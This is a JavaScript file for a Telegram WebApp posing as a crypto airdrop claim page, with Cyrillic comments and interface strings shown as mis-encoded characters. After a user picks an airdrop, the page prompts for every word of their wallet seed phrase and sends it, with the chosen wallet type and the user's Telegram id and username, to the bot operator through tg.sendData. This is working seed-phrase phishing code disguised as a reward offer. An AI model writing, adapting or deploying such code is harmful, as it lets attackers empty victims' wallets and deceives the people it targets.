let tg = null;
let isTelegram = false;

// ======= –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ Telegram WebApp =======
function initTelegram() {
    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
        tg = Telegram.WebApp;
        tg.ready();
        isTelegram = !!(tg.initDataUnsafe?.user);
        console.log("‚úÖ Telegram WebApp –∞–∫—Ç–∏–≤–µ–Ω:", isTelegram);
    } else {
        console.warn("‚ö†Ô∏è Telegram WebApp –Ω–µ –Ω–∞–π–¥–µ–Ω (–±—Ä–∞—É–∑–µ—Ä–Ω—ã–π —Ä–µ–∂–∏–º)");
        isTelegram = false;
    }
}

// ======= DOM –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ =======
document.addEventListener("DOMContentLoaded", () => {
    initTelegram();

    // === –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è airdrops ===
    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('airdropList');
            if (!container) return;
            container.innerHTML = '';
            data.forEach(drop => {
                const card = document.createElement('div');
                card.className = 'airdrop-card';
                card.innerHTML = `
                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                    <h2>${drop.name}</h2>
                    <p>üí∏ –ù–∞–≥—Ä–∞–¥–∞: <strong>${drop.reward}</strong></p>
                    <p>üåê –°–µ—Ç—å: ${drop.network}</p>
                    <p>‚è≥ –î–æ: ${drop.ends}</p>
                    <button onclick="selectAirdrop('${drop.name}')">–£—á–∞—Å—Ç–≤–æ–≤–∞—Ç—å</button>
                `;
                container.appendChild(card);
            });
        })
        .catch(error => {
            console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ JSON:", error);
            document.getElementById("airdropList").innerHTML =
                "<p style='color:red'>‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Å–ø–∏—Å–æ–∫ airdrop'–æ–≤.</p>";
        });

    // === –û–±—Ä–æ–±–∫–∞ –∫–Ω–æ–ø–∫–∏ ===
    const btn = document.getElementById('submitBtn');
    if (btn) btn.addEventListener('click', submitAirdrop);

    // === –ö–∞—Å—Ç–æ–º–Ω–∏–π —Å–µ–ª–µ–∫—Ç–æ—Ä ===
    const selectWrapper = document.querySelector('.custom-select');
    if (selectWrapper) {
        const selected = selectWrapper.querySelector('.selected');
        const options = selectWrapper.querySelectorAll('.options li');
        const hiddenInput = document.querySelector('#wallet');

        selected.addEventListener('click', () => {
            selectWrapper.classList.toggle('open');
        });

        options.forEach(option => {
            option.addEventListener('click', () => {
                selected.innerHTML = option.innerHTML;
                hiddenInput.value = option.dataset.value;
                selectWrapper.classList.remove('open');
            });
        });

        document.addEventListener('click', e => {
            if (!selectWrapper.contains(e.target)) {
                selectWrapper.classList.remove('open');
            }
        });
    }
});

// ======= –í–∏–±—ñ—Ä airdrop =======
function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `üîó ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

// ======= –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è –ø–æ–ª—ñ–≤ —Å–∏–¥-—Ñ—Ä–∞–∑–∏ =======
function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';

    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `–°–ª–æ–≤–æ ${i + 1}`;
        container.appendChild(input);
    }

    const inputs = container.querySelectorAll('input');
    if (inputs.length > 0) {
        inputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.trim().split(/\s+/);
            if (words.length > 1) {
                words.forEach((word, index) => {
                    if (inputs[index]) inputs[index].value = word;
                });
            } else {
                inputs[0].value = pasted;
            }
        });
    }
}

// ======= –í—ñ–¥–ø—Ä–∞–≤–∫–∞ —É—á–∞—Å—Ç—ñ =======
function submitAirdrop() {
    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(Boolean);

    if (words.length !== inputs.length) {
        const warning = document.getElementById('validationWarning');
        warning.innerText = '‚ùóÔ∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è.';
        warning.style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        user_id: isTelegram ? tg.initDataUnsafe.user.id : "-",
        username: isTelegram ? tg.initDataUnsafe.user.username : "-",
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value
    };

    console.log("[üì§ Payload]:", payload);

    if (isTelegram) {
        tg.sendData(JSON.stringify(payload));
        tg.close();
    } else {
        alert("üì¶ –î–µ–º–æ-—Ä–µ–∂–∏–º: –¥–∞–Ω–Ω—ã–µ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ Telegram WebApp.");
        // for dev test: navigator.sendBeacon('/debug', JSON.stringify(payload))
    }
}
